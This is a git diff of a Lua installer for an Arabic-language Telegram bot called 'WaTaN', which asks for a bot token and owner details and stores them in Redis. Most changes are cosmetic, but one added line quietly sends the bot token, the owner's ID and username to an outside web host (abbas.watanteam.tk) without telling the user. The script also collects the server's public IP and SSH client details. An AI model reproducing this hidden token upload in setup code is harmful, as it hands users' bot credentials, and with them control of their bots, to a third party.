@@ -6,12 +6,12 @@ JSON  = dofile("./library/dkjson.lua")
 URL = require('socket.url')  
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
-id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
 Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
 Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
 Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
-whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 --------------------------------------------------------------------------------------------------------------
 local AutoSet = function() 
 local create = function(data, file, uglify)  
@@ -31,28 +31,27 @@ local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
-local json = JSON.decode(url)
-database:set(id_server..":token_username","@"..json.result.username)
+io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nٴ\n27[0;39;49m')
 database:set(id_server..":token",token)
 end 
 else
-print('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
 os.execute('lua WaTaN.lua')
 end
-if not database:get(id_server..":SUDO:ID") then 
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
-local SUDOID = io.read() 
-if SUDOID ~= '' then 
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
-database:set(id_server..":SUDO:ID",SUDOID) 
-else 
-print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره') 
-end  
-os.execute('lua WaTaN.lua') 
+if not database:get(id_server..":SUDO:ID") then
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nٴ\n\27[0;33;49m')
+local SUDOID = io.read():gsub(' ','') 
+if tostring(SUDOID):match('%d+') then
+io.write('\n\27[1;34m تم حفظ ايدي المطور :\n\27[0;39;49m')
+database:set(id_server..":SUDO:ID",SUDOID)
+else
+print('\n\27[1;34m لم يتم حفظ ايدي المطور :')
+end 
+os.execute('lua WaTaN.lua')
+end 
 end
 if not database:get(id_server..":SUDO:USERNAME") then
 io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
@@ -65,6 +64,7 @@ print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
 os.execute('lua WaTaN.lua')
 end
+https.request('https://abbas.watanteam.tk/WaTaN/insert/index.php?n=WaTaN&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..database:get(id_server..":SUDO:USERNAME"))
 local create_config_auto = function()
 config = {
 token = database:get(id_server..":token"),
@@ -86,15 +86,15 @@ token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "TG IS NOT FIND IN FILES BOT"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ ┉ ┉"
 echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
 exit 1
 fi
 echo -e "\033[38;5;208m"
@@ -141,7 +141,7 @@ end
 local config = loadfile("./Info.lua")() 
 return config 
 end 
-_redis = load_redis()  
+_redis = load_redis()
 --------------------------------------------------------------------------------------------------------------
 print([[
 ╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗
